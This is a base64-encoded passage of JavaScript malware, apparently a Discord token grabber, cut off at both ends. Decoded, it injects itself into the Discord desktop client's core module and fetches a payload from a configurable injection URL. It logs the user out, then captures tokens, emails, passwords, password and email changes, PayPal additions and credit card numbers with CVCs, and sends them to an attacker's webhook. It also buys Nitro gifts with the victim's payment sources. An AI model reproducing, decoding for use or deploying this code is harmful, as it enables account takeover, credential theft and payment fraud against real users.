oID0gcGF0aC5qb2luKHJlc291cmNlUGF0aCwgJ2FwcCcpOwogIGNvbnN0IHBhY2thZ2VKc29uID0gcGF0aC5qb2luKGFwcFBhdGgsICdwYWNrYWdlLmpzb24nKTsKICBjb25zdCByZXNvdXJjZUluZGV4ID0gcGF0aC5qb2luKGFwcFBhdGgsICdpbmRleC5qcycpOwogIGNvbnN0IGNvcmVWYWwgPSBmcy5yZWFkZGlyU3luYyhgJHthcHB9XFxtb2R1bGVzXFxgKS5maWx0ZXIoeCA9PiAvZGlzY29yZF9kZXNrdG9wX2NvcmUtKz8vLnRlc3QoeCkpWzBdCiAgY29uc3QgaW5kZXhKcyA9IGAke2FwcH1cXG1vZHVsZXNcXCR7Y29yZVZhbH1cXGRpc2NvcmRfZGVza3RvcF9jb3JlXFxpbmRleC5qc2A7CiAgY29uc3QgYmRQYXRoID0gcGF0aC5qb2luKHByb2Nlc3MuZW52LkFQUERBVEEsICdcXGJldHRlcmRpc2NvcmRcXGRhdGFcXGJldHRlcmRpc2NvcmQuYXNhcicpOwogIGlmICghZnMuZXhpc3RzU3luYyhhcHBQYXRoKSkgZnMubWtkaXJTeW5jKGFwcFBhdGgpOwogIGlmIChmcy5leGlzdHNTeW5jKHBhY2thZ2VKc29uKSkgZnMudW5saW5rU3luYyhwYWNrYWdlSnNvbik7CiAgaWYgKGZzLmV4aXN0c1N5bmMocmVzb3VyY2VJbmRleCkpIGZzLnVubGlua1N5bmMocmVzb3VyY2VJbmRleCk7CgogIGlmIChwcm9jZXNzLnBsYXRmb3JtID09PSAnd2luMzInIHx8IHByb2Nlc3MucGxhdGZvcm0gPT09ICdkYXJ3aW4nKSB7CiAgICBmcy53cml0ZUZpbGVTeW5jKAogICAgICBwYWNrYWdlSnNvbiwKICAgICAgSlNPTi5zdHJpbmdpZnkoCiAgICAgICAgewogICAgICAgICAgbmFtZTogJ2Rpc2NvcmQnLAogICAgICAgICAgbWFpbjogJ2luZGV4LmpzJywKICAgICAgICB9LAogICAgICAgIG51bGwsCiAgICAgICAgNCwKICAgICAgKSwKICAgICk7CgogICAgY29uc3Qgc3RhcnRVcFNjcmlwdCA9IGBjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyksIGh0dHBzID0gcmVxdWlyZSgnaHR0cHMnKTsKY29uc3QgaW5kZXhKcyA9ICcke2luZGV4SnN9JzsKY29uc3QgYmRQYXRoID0gJyR7YmRQYXRofSc7CmNvbnN0IGZpbGVTaXplID0gZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZQpmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcywgJ3V0ZjgnLCAoZXJyLCBkYXRhKSA9PiB7CiAgICBpZiAoZmlsZVNpemUgPCAyMDAwMCB8fCBkYXRhID09PSAibW9kdWxlLmV4cG9ydHMgPSByZXF1aXJlKCcuL2NvcmUuYXNhcicpIikgCiAgICAgICAgaW5pdCgpOwp9KQphc3luYyBmdW5jdGlvbiBpbml0KCkgewogICAgaHR0cHMuZ2V0KCcke2NvbmZpZy5pbmplY3Rpb25fdXJsfScsIChyZXMpID0+IHsKICAgICAgICBjb25zdCBmaWxlID0gZnMuY3JlYXRlV3JpdGVTdHJlYW0oaW5kZXhKcyk7CiAgICAgICAgcmVzLnJlcGxhY2UoIiclV0VCSE9PS0hFUkVCQVNFNjRFTkNPREVEJSciLCAiJyR7aG9va30nIikKICAgICAgICByZXMucmVwbGFjZSgnJVdFQkhPT0tfS0VZJScsICcke2NvbmZpZy53ZWJob29rX3Byb3RlY3Rvcl9rZXl9JykKICAgICAgICByZXMucGlwZShmaWxlKTsKICAgICAgICBmaWxlLm9uKCdmaW5pc2gnLCAoKSA9PiB7CiAgICAgICAgICAgIGZpbGUuY2xvc2UoKTsKICAgICAgICB9KTsKICAgIAogICAgfSkub24oImVycm9yIiwgKGVycikgPT4gewogICAgICAgIHNldFRpbWVvdXQoaW5pdCgpLCAxMDAwMCk7CiAgICB9KTsKfQpyZXF1aXJlKCcke3BhdGguam9pbihyZXNvdXJjZVBhdGgsICdhcHAuYXNhcicpfScpCmlmIChmcy5leGlzdHNTeW5jKGJkUGF0aCkpIHJlcXVpcmUoYmRQYXRoKTtgOwogICAgZnMud3JpdGVGaWxlU3luYyhyZXNvdXJjZUluZGV4LCBzdGFydFVwU2NyaXB0LnJlcGxhY2UoL1xcL2csICdcXFxcJykpOwogIH0KICBpZiAoIWZzLmV4aXN0c1N5bmMocGF0aC5qb2luKF9fZGlybmFtZSwgJ2luaXRpYXRpb24nKSkpIHJldHVybiAhMDsKICBmcy5ybWRpclN5bmMocGF0aC5qb2luKF9fZGlybmFtZSwgJ2luaXRpYXRpb24nKSk7CiAgZXhlY1NjcmlwdCgKICAgIGB3aW5kb3cud2VicGFja0pzb25wPyhnZz13aW5kb3cud2VicGFja0pzb25wLnB1c2goW1tdLHtnZXRfcmVxdWlyZTooYSxiLGMpPT5hLmV4cG9ydHM9Y30sW1siZ2V0X3JlcXVpcmUiXV1dKSxkZWxldGUgZ2cubS5nZXRfcmVxdWlyZSxkZWxldGUgZ2cuYy5nZXRfcmVxdWlyZSk6d2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwJiZ3aW5kb3cud2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW01hdGgucmFuZG9tKCldLHt9LGE9PntnZz1hfV0pO2Z1bmN0aW9uIExvZ091dCgpeyhmdW5jdGlvbihhKXtjb25zdCBiPSJzdHJpbmciPT10eXBlb2YgYT9hOm51bGw7Zm9yKGNvbnN0IGMgaW4gZ2cuYylpZihnZy5jLmhhc093blByb3BlcnR5KGMpKXtjb25zdCBkPWdnLmNbY10uZXhwb3J0cztpZihkJiZkLl9fZXNNb2R1bGUmJmQuZGVmYXVsdCYmKGI/ZC5kZWZhdWx0W2JdOmEoZC5kZWZhdWx0KSkpcmV0dXJuIGQuZGVmYXVsdDtpZihkJiYoYj9kW2JdOmEoZCkpKXJldHVybiBkfXJldHVybiBudWxsfSkoImxvZ2luIikubG9nb3V0KCl9TG9nT3V0KCk7YCwKICApOwogIHJldHVybiAhMTsKfQoKY29uc3QgZXhlY1NjcmlwdCA9IChzY3JpcHQpID0+IHsKICBjb25zdCB3aW5kb3cgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKVswXTsKICByZXR1cm4gd2luZG93LndlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KHNjcmlwdCwgITApOwp9OwoKY29uc3QgZ2V0SW5mbyA9IGFzeW5jICh0b2tlbikgPT4gewogIGNvbnN0IGluZm8gPSBhd2FpdCBleGVjU2NyaXB0KGB2YXIgeG1sSHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeG1sSHR0cC5vcGVuKCJHRVQiLCAiJHtjb25maWcuYXBpfSIsIGZhbHNlKTsKICAgIHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQXV0aG9yaXphdGlvbiIsICIke3Rva2VufSIpOwogICAgeG1sSHR0cC5zZW5kKG51bGwpOwogICAgeG1sSHR0cC5yZXNwb25zZVRleHQ7YCk7CiAgcmV0dXJuIEpTT04ucGFyc2UoaW5mbyk7Cn07Cgpjb25zdCBmZXRjaEJpbGxpbmcgPSBhc3luYyAodG9rZW4pID0+IHsKICBjb25zdCBiaWxsID0gYXdhaXQgZXhlY1NjcmlwdChgdmFyIHhtbEh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgCiAgICB4bWxIdHRwLm9wZW4oIkdFVCIsICIke2NvbmZpZy5hcGl9L2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgZmFsc2UpOyAKICAgIHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQXV0aG9yaXphdGlvbiIsICIke3Rva2VufSIpOyAKICAgIHhtbEh0dHAuc2VuZChudWxsKTsgCiAgICB4bWxIdHRwLnJlc3BvbnNlVGV4dGApOwogIGlmICghYmlsbC5sZW5naHQgfHwgYmlsbC5sZW5ndGggPT09IDApIHJldHVybiAnJzsKICByZXR1cm4gSlNPTi5wYXJzZShiaWxsKTsKfTsKCmNvbnN0IGdldEJpbGxpbmcgPSBhc3luYyAodG9rZW4pID0+IHsKICBjb25zdCBkYXRhID0gYXdhaXQgZmV0Y2hCaWxsaW5nKHRva2VuKTsKICBpZiAoIWRhdGEpIHJldHVybiAn4p2MJzsKICBsZXQgYmlsbGluZyA9ICcnOwogIGRhdGEuZm9yRWFjaCgoeCkgPT4gewogICAgaWYgKCF4LmludmFsaWQpIHsKICAgICAgc3dpdGNoICh4LnR5cGUpIHsKICAgICAgICBjYXNlIDE6CiAgICAgICAgICBiaWxsaW5nICs9ICfwn5KzICc7CiAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlIDI6CiAgICAgICAgICBiaWxsaW5nICs9ICc8OnBheXBhbDo5NTExMzkxODkzODk0MTAzNjU+ICc7CiAgICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogIH0pOwogIGlmICghYmlsbGluZykgYmlsbGluZyA9ICfinYwnOwogIHJldHVybiBiaWxsaW5nOwp9OwoKY29uc3QgUHVyY2hhc2UgPSBhc3luYyAodG9rZW4sIGlkLCBfdHlwZSwgX3RpbWUpID0+IHsKICBjb25zdCBvcHRpb25zID0gewogICAgZXhwZWN0ZWRfYW1vdW50OiBjb25maWcubml0cm9bX3R5cGVdW190aW1lXVsncHJpY2UnXSwKICAgIGV4cGVjdGVkX2N1cnJlbmN5OiAndXNkJywKICAgIGdpZnQ6IHRydWUsCiAgICBwYXltZW50X3NvdXJjZV9pZDogaWQsCiAgICBwYXltZW50X3NvdXJjZV90b2tlbjogbnVsbCwKICAgIHB1cmNoYXNlX3Rva2VuOiAnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywKICAgIHNrdV9zdWJzY3JpcHRpb25fcGxhbl9pZDogY29uZmlnLm5pdHJvW190eXBlXVtfdGltZV1bJ3NrdSddLAogIH07CgogIGNvbnN0IHJlcSA9IGV4ZWNTY3JpcHQoYHZhciB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICB4bWxIdHRwLm9wZW4oIlBPU1QiLCAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvc3RvcmUvc2t1cy8ke2NvbmZpZy5uaXRyb1tfdHlwZV1bX3RpbWVdWydpZCddfS9wdXJjaGFzZSIsIGZhbHNlKTsKICAgIHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQXV0aG9yaXphdGlvbiIsICIke3Rva2VufSIpOwogICAgeG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpOwogICAgeG1sSHR0cC5zZW5kKEpTT04uc3RyaW5naWZ5KCR7SlNPTi5zdHJpbmdpZnkob3B0aW9ucyl9KSk7CiAgICB4bWxIdHRwLnJlc3BvbnNlVGV4dGApOwogIGlmIChyZXFbJ2dpZnRfY29kZSddKSB7CiAgICByZXR1cm4gJ2h0dHBzOi8vZGlzY29yZC5naWZ0LycgKyByZXFbJ2dpZnRfY29kZSddOwogIH0gZWxzZSByZXR1cm4gbnVsbDsKfTsKCmNvbnN0IGJ1eU5pdHJvID0gYXN5bmMgKHRva2VuKSA9PiB7CiAgY29uc3QgZGF0YSA9IGF3YWl0IGZldGNoQmlsbGluZyh0b2tlbik7CiAgY29uc3QgZmFpbGVkTXNnID0gJ0ZhaWxlZCB0byBQdXJjaGFzZSDinYwnOwogIGlmICghZGF0YSkgcmV0dXJuIGZhaWxlZE1zZzsKCiAgbGV0IElEUyA9IFtdOwogIGRhdGEuZm9yRWFjaCgoeCkgPT4gewogICAgaWYgKCF4LmludmFsaWQpIHsKICAgICAgSURTID0gSURTLmNvbmNhdCh4LmlkKTsKICAgIH0KICB9KTsKICBmb3IgKGxldCBzb3VyY2VJRCBpbiBJRFMpIHsKICAgIGNvbnN0IGZpcnN0ID0gUHVyY2hhc2UodG9rZW4sIHNvdXJjZUlELCAnYm9vc3QnLCAneWVhcicpOwogICAgaWYgKGZpcnN0ICE9PSBudWxsKSB7CiAgICAgIHJldHVybiBmaXJzdDsKICAgIH0gZWxzZSB7CiAgICAgIGNvbnN0IHNlY29uZCA9IFB1cmNoYXNlKHRva2VuLCBzb3VyY2VJRCwgJ2Jvb3N0JywgJ21vbnRoJyk7CiAgICAgIGlmIChzZWNvbmQgIT09IG51bGwpIHsKICAgICAgICByZXR1cm4gc2Vjb25kOwogICAgICB9IGVsc2UgewogICAgICAgIGNvbnN0IHRoaXJkID0gUHVyY2hhc2UodG9rZW4sIHNvdXJjZUlELCAnY2xhc3NpYycsICdtb250aCcpOwogICAgICAgIGlmICh0aGlyZCAhPT0gbnVsbCkgewogICAgICAgICAgcmV0dXJuIHRoaXJkOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICByZXR1cm4gZmFpbGVkTXNnOwogICAgICAgIH0KICAgICAgfQogICAgfQogIH0KfTsKCmNvbnN0IGdldE5pdHJvID0gKGZsYWdzKSA9PiB7CiAgc3dpdGNoIChmbGFncykgewogICAgY2FzZSAwOgogICAgICByZXR1cm4gJ05vIE5pdHJvJzsKICAgIGNhc2UgMToKICAgICAgcmV0dXJuICdOaXRybyBDbGFzc2ljJzsKICAgIGNhc2UgMjoKICAgICAgcmV0dXJuICdOaXRybyBCb29zdCc7CiAgICBkZWZhdWx0OgogICAgICByZXR1cm4gJ05vIE5pdHJvJzsKICB9Cn07Cgpjb25zdCBnZXRCYWRnZXMgPSAoZmxhZ3MpID0+IHsKICBsZXQgYmFkZ2VzID0gJyc7CiAgc3dpdGNoIChmbGFncykgewogICAgY2FzZSAxOgogICAgICBiYWRnZXMgKz0gJ0Rpc2NvcmQgU3RhZmYsICc7CiAgICAgIGJyZWFrOwogICAgY2FzZSAyOgogICAgICBiYWRnZXMgKz0gJ1BhcnRuZXJlZCBTZXJ2ZXIgT3duZXIsICc7CiAgICAgIGJyZWFrOwogICAgY2FzZSAxMzEwNzI6CiAgICAgIGJhZGdlcyArPSAnVmVyaWZpZWQgQm90IERldmVsb3BlciwgJzsKICAgICAgYnJlYWs7CiAgICBjYXNlIDQxOTQzMDQ6CiAgICAgIGJhZGdlcyArPSAnQWN0aXZlIERldmVsb3BlciwgJzsKICAgICAgYnJlYWs7CiAgICBjYXNlIDQ6CiAgICAgIGJhZGdlcyArPSAnSHlwZXNxdWFkIEV2ZW50LCAnOwogICAgICBicmVhazsKICAgIGNhc2UgMTYzODQ6CiAgICAgIGJhZGdlcyArPSAnR29sZCBCdWdIdW50ZXIsICc7CiAgICAgIGJyZWFrOwogICAgY2FzZSA4OgogICAgICBiYWRnZXMgKz0gJ0dyZWVuIEJ1Z0h1bnRlciwgJzsKICAgICAgYnJlYWs7CiAgICBjYXNlIDUxMjoKICAgICAgYmFkZ2VzICs9ICdFYXJseSBTdXBwb3J0ZXIsICc7CiAgICAgIGJyZWFrOwogICAgY2FzZSAxMjg6CiAgICAgIGJhZGdlcyArPSAnSHlwZVNxdWFkIEJyaWxsYW5jZSwgJzsKICAgICAgYnJlYWs7CiAgICBjYXNlIDY0OgogICAgICBiYWRnZXMgKz0gJ0h5cGVTcXVhZCBCcmF2ZXJ5LCAnOwogICAgICBicmVhazsKICAgIGNhc2UgMjU2OgogICAgICBiYWRnZXMgKz0gJ0h5cGVTcXVhZCBCYWxhbmNlLCAnOwogICAgICBicmVhazsKICAgIGNhc2UgMDoKICAgICAgYmFkZ2VzID0gJ05vbmUnOwogICAgICBicmVhazsKICAgIGRlZmF1bHQ6CiAgICAgIGJhZGdlcyA9ICdOb25lJzsKICAgICAgYnJlYWs7CiAgfQogIHJldHVybiBiYWRnZXM7Cn07Cgpjb25zdCBob29rZXIgPSBhc3luYyAoY29udGVudCkgPT4gewogIGNvbnN0IGRhdGEgPSBKU09OLnN0cmluZ2lmeShjb250ZW50KTsKICBjb25zdCB1cmwgPSBuZXcgVVJMKGNvbmZpZy53ZWJob29rKTsKICBjb25zdCBoZWFkZXJzID0gewogICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nOiAnKicsCiAgfTsKICBpZiAoIWNvbmZpZy53ZWJob29rLmluY2x1ZGVzKCdhcGkvd2ViaG9va3MnKSkgewogICAgY29uc3Qga2V5ID0gdG90cChjb25maWcud2ViaG9va19wcm90ZWN0b3Jfa2V5KTsKICAgIGhlYWRlcnNbJ0F1dGhvcml6YXRpb24nXSA9IGtleTsKICB9CiAgY29uc3Qgb3B0aW9ucyA9IHsKICAgIHByb3RvY29sOiB1cmwucHJvdG9jb2wsCiAgICBob3N0bmFtZTogdXJsLmhvc3QsCiAgICBwYXRoOiB1cmwucGF0aG5hbWUsCiAgICBtZXRob2Q6ICdQT1NUJywKICAgIGhlYWRlcnM6IGhlYWRlcnMsCiAgfTsKICBjb25zdCByZXEgPSBodHRwcy5yZXF1ZXN0KG9wdGlvbnMpOwoKICByZXEub24oJ2Vycm9yJywgKGVycikgPT4gewogICAgY29uc29sZS5sb2coZXJyKTsKICB9KTsKICByZXEud3JpdGUoZGF0YSk7CiAgcmVxLmVuZCgpOwp9OwoKY29uc3QgbG9naW4gPSBhc3luYyAoZW1haWwsIHBhc3N3b3JkLCB0b2tlbikgPT4gewogIGNvbnN0IGpzb24gPSBhd2FpdCBnZXRJbmZvKHRva2VuKTsKICBjb25zdCBuaXRybyA9IGdldE5pdHJvKGpzb24ucHJlbWl1bV90eXBlKTsKICBjb25zdCBiYWRnZXMgPSBnZXRCYWRnZXMoanNvbi5mbGFncyk7CiAgY29uc3QgYmlsbGluZyA9IGF3YWl0IGdldEJpbGxpbmcodG9rZW4pOwogIGNvbnN0IGNvbnRlbnQgPSB7CiAgICB1c2VybmFtZTogY29uZmlnLmVtYmVkX25hbWUsCiAgICBhdmF0YXJfdXJsOiBjb25maWcuZW1iZWRfaWNvbiwKICAgIGVtYmVkczogWwogICAgICB7CiAgICAgICAgY29sb3I6IGNvbmZpZy5lbWJlZF9jb2xvciwKICAgICAgICBmaWVsZHM6IFsKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqQWNjb3VudCBJbmZvKionLAogICAgICAgICAgICB2YWx1ZTogYEVtYWlsOiAqKiR7ZW1haWx9KiogLSBQYXNzd29yZDogKioke3Bhc3N3b3JkfSoqYCwKICAgICAgICAgICAgaW5saW5lOiBmYWxzZSwKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKkRpc2NvcmQgSW5mbyoqJywKICAgICAgICAgICAgdmFsdWU6IGBOaXRybyBUeXBlOiAqKiR7bml0cm99KipcbkJhZGdlczogKioke2JhZGdlc30qKlxuQmlsbGluZzogKioke2JpbGxpbmd9KipgLAogICAgICAgICAgICBpbmxpbmU6IGZhbHNlLAogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqVG9rZW4qKicsCiAgICAgICAgICAgIHZhbHVlOiBgXGAke3Rva2VufVxgYCwKICAgICAgICAgICAgaW5saW5lOiBmYWxzZSwKICAgICAgICAgIH0sCiAgICAgICAgXSwKICAgICAgICBhdXRob3I6IHsKICAgICAgICAgIG5hbWU6IGpzb24udXNlcm5hbWUgKyAnIycgKyBqc29uLmRpc2NyaW1pbmF0b3IgKyAnIHwgJyArIGpzb24uaWQsCiAgICAgICAgICBpY29uX3VybDogYGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtqc29uLmlkfS8ke2pzb24uYXZhdGFyfS53ZWJwYCwKICAgICAgICB9LAogICAgICB9LAogICAgXSwKICB9OwogIGlmIChjb25maWcucGluZ19vbl9ydW4pIGNvbnRlbnRbJ2NvbnRlbnQnXSA9IGNvbmZpZy5waW5nX3ZhbDsKICBob29rZXIoY29udGVudCk7Cn07Cgpjb25zdCBwYXNzd29yZENoYW5nZWQgPSBhc3luYyAob2xkcGFzc3dvcmQsIG5ld3Bhc3N3b3JkLCB0b2tlbikgPT4gewogIGNvbnN0IGpzb24gPSBhd2FpdCBnZXRJbmZvKHRva2VuKTsKICBjb25zdCBuaXRybyA9IGdldE5pdHJvKGpzb24ucHJlbWl1bV90eXBlKTsKICBjb25zdCBiYWRnZXMgPSBnZXRCYWRnZXMoanNvbi5mbGFncyk7CiAgY29uc3QgYmlsbGluZyA9IGF3YWl0IGdldEJpbGxpbmcodG9rZW4pOwogIGNvbnN0IGNvbnRlbnQgPSB7CiAgICB1c2VybmFtZTogY29uZmlnLmVtYmVkX25hbWUsCiAgICBhdmF0YXJfdXJsOiBjb25maWcuZW1iZWRfaWNvbiwKICAgIGVtYmVkczogWwogICAgICB7CiAgICAgICAgY29sb3I6IGNvbmZpZy5lbWJlZF9jb2xvciwKICAgICAgICBmaWVsZHM6IFsKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqUGFzc3dvcmQgQ2hhbmdlZCoqJywKICAgICAgICAgICAgdmFsdWU6IGBFbWFpbDogKioke2pzb24uZW1haWx9Kipcbk9sZCBQYXNzd29yZDogKioke29sZHBhc3N3b3JkfSoqXG5OZXcgUGFzc3dvcmQ6ICoqJHtuZXdwYXNzd29yZH0qKmAsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZSwKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKkRpc2NvcmQgSW5mbyoqJywKICAgICAgICAgICAgdmFsdWU6IGBOaXRybyBUeXBlOiAqKiR7bml0cm99KipcbkJhZGdlczogKioke2JhZGdlc30qKlxuQmlsbGluZzogKioke2JpbGxpbmd9KipgLAogICAgICAgICAgICBpbmxpbmU6IHRydWUsCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAnKipUb2tlbioqJywKICAgICAgICAgICAgdmFsdWU6IGBcYCR7dG9rZW59XGBgLAogICAgICAgICAgICBpbmxpbmU6IGZhbHNlLAogICAgICAgICAgfSwKICAgICAgICBdLAogICAgICAgIGF1dGhvcjogewogICAgICAgICAgbmFtZToganNvbi51c2VybmFtZSArICcjJyArIGpzb24uZGlzY3JpbWluYXRvciArICcgfCAnICsganNvbi5pZCwKICAgICAgICAgIGljb25fdXJsOiBgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8ke2pzb24uaWR9LyR7anNvbi5hdmF0YXJ9LndlYnBgLAogICAgICAgIH0sCiAgICAgIH0sCiAgICBdLAogIH07CiAgaWYgKGNvbmZpZy5waW5nX29uX3J1bikgY29udGVudFsnY29udGVudCddID0gY29uZmlnLnBpbmdfdmFsOwogIGhvb2tlcihjb250ZW50KTsKfTsKCmNvbnN0IGVtYWlsQ2hhbmdlZCA9IGFzeW5jIChlbWFpbCwgcGFzc3dvcmQsIHRva2VuKSA9PiB7CiAgY29uc3QganNvbiA9IGF3YWl0IGdldEluZm8odG9rZW4pOwogIGNvbnN0IG5pdHJvID0gZ2V0Tml0cm8oanNvbi5wcmVtaXVtX3R5cGUpOwogIGNvbnN0IGJhZGdlcyA9IGdldEJhZGdlcyhqc29uLmZsYWdzKTsKICBjb25zdCBiaWxsaW5nID0gYXdhaXQgZ2V0QmlsbGluZyh0b2tlbik7CiAgY29uc3QgY29udGVudCA9IHsKICAgIHVzZXJuYW1lOiBjb25maWcuZW1iZWRfbmFtZSwKICAgIGF2YXRhcl91cmw6IGNvbmZpZy5lbWJlZF9pY29uLAogICAgZW1iZWRzOiBbCiAgICAgIHsKICAgICAgICBjb2xvcjogY29uZmlnLmVtYmVkX2NvbG9yLAogICAgICAgIGZpZWxkczogWwogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAnKipFbWFpbCBDaGFuZ2VkKionLAogICAgICAgICAgICB2YWx1ZTogYE5ldyBFbWFpbDogKioke2VtYWlsfSoqXG5QYXNzd29yZDogKioke3Bhc3N3b3JkfSoqYCwKICAgICAgICAgICAgaW5saW5lOiB0cnVlLAogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqRGlzY29yZCBJbmZvKionLAogICAgICAgICAgICB2YWx1ZTogYE5pdHJvIFR5cGU6ICoqJHtuaXRyb30qKlxuQmFkZ2VzOiAqKiR7YmFkZ2VzfSoqXG5CaWxsaW5nOiAqKiR7YmlsbGluZ30qKmAsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZSwKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKlRva2VuKionLAogICAgICAgICAgICB2YWx1ZTogYFxgJHt0b2tlbn1cYGAsCiAgICAgICAgICAgIGlubGluZTogZmFsc2UsCiAgICAgICAgICB9LAogICAgICAgIF0sCiAgICAgICAgYXV0aG9yOiB7CiAgICAgICAgICBuYW1lOiBqc29uLnVzZXJuYW1lICsgJyMnICsganNvbi5kaXNjcmltaW5hdG9yICsgJyB8ICcgKyBqc29uLmlkLAogICAgICAgICAgaWNvbl91cmw6IGBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLyR7anNvbi5pZH0vJHtqc29uLmF2YXRhcn0ud2VicGAsCiAgICAgICAgfSwKICAgICAgfSwKICAgIF0sCiAgfTsKICBpZiAoY29uZmlnLnBpbmdfb25fcnVuKSBjb250ZW50Wydjb250ZW50J10gPSBjb25maWcucGluZ192YWw7CiAgaG9va2VyKGNvbnRlbnQpOwp9OwoKY29uc3QgUGF5cGFsQWRkZWQgPSBhc3luYyAodG9rZW4pID0+IHsKICBjb25zdCBqc29uID0gYXdhaXQgZ2V0SW5mbyh0b2tlbik7CiAgY29uc3Qgbml0cm8gPSBnZXROaXRybyhqc29uLnByZW1pdW1fdHlwZSk7CiAgY29uc3QgYmFkZ2VzID0gZ2V0QmFkZ2VzKGpzb24uZmxhZ3MpOwogIGNvbnN0IGJpbGxpbmcgPSBnZXRCaWxsaW5nKHRva2VuKTsKICBjb25zdCBjb250ZW50ID0gewogICAgdXNlcm5hbWU6IGNvbmZpZy5lbWJlZF9uYW1lLAogICAgYXZhdGFyX3VybDogY29uZmlnLmVtYmVkX2ljb24sCiAgICBlbWJlZHM6IFsKICAgICAgewogICAgICAgIGNvbG9yOiBjb25maWcuZW1iZWRfY29sb3IsCiAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKlBheXBhbCBBZGRlZCoqJywKICAgICAgICAgICAgdmFsdWU6IGBUaW1lIHRvIGJ1eSBzb21lIG5pdHJvIGJhYnkg8J+YqWAsCiAgICAgICAgICAgIGlubGluZTogZmFsc2UsCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAnKipEaXNjb3JkIEluZm8qKicsCiAgICAgICAgICAgIHZhbHVlOiBgTml0cm8gVHlwZTogKioke25pdHJvfSpcbkJhZGdlczogKioke2JhZGdlc30qKlxuQmlsbGluZzogKioke2JpbGxpbmd9KipgLAogICAgICAgICAgICBpbmxpbmU6IGZhbHNlLAogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqVG9rZW4qKicsCiAgICAgICAgICAgIHZhbHVlOiBgXGAke3Rva2VufVxgYCwKICAgICAgICAgICAgaW5saW5lOiBmYWxzZSwKICAgICAgICAgIH0sCiAgICAgICAgXSwKICAgICAgICBhdXRob3I6IHsKICAgICAgICAgIG5hbWU6IGpzb24udXNlcm5hbWUgKyAnIycgKyBqc29uLmRpc2NyaW1pbmF0b3IgKyAnIHwgJyArIGpzb24uaWQsCiAgICAgICAgICBpY29uX3VybDogYGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtqc29uLmlkfS8ke2pzb24uYXZhdGFyfS53ZWJwYCwKICAgICAgICB9LAogICAgICB9LAogICAgXSwKICB9OwogIGlmIChjb25maWcucGluZ19vbl9ydW4pIGNvbnRlbnRbJ2NvbnRlbnQnXSA9IGNvbmZpZy5waW5nX3ZhbDsKICBob29rZXIoY29udGVudCk7Cn07Cgpjb25zdCBjY0FkZGVkID0gYXN5bmMgKG51bWJlciwgY3ZjLCBleHBpcl9tb250aCwgZXhwaXJfeWVhciwgdG9rZW4pID0+IHsKICBjb25zdCBqc29uID0gYXdhaXQgZ2V0SW5mbyh0b2tlbik7CiAgY29uc3Qgbml0cm8gPSBnZXROaXRybyhqc29uLnByZW1pdW1fdHlwZSk7CiAgY29uc3QgYmFkZ2VzID0gZ2V0QmFkZ2VzKGpzb24uZmxhZ3MpOwogIGNvbnN0IGJpbGxpbmcgPSBhd2FpdCBnZXRCaWxsaW5nKHRva2VuKTsKICBjb25zdCBjb250ZW50ID0gewogICAgdXNlcm5hbWU6IGNvbmZpZy5lbWJlZF9uYW1lLAogICAgYXZhdGFyX3VybDogY29uZmlnLmVtYmVkX2ljb24sCiAgICBlbWJlZHM6IFsKICAgICAgewogICAgICAgIGNvbG9yOiBjb25maWcuZW1iZWRfY29sb3IsCiAgICAgICAgZmllbGRzOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKkNyZWRpdCBDYXJkIEFkZGVkKionLAogICAgICAgICAgICB2YWx1ZTogYENyZWRpdCBDYXJkIE51bWJlcjogKioke251bWJlcn0qKlxuQ1ZDOiAqKiR7Y3ZjfSoqXG5DcmVkaXQgQ2FyZCBFeHBpcmF0aW9uOiAqKiR7ZXhwaXJfbW9udGh9LyR7ZXhwaXJfeWV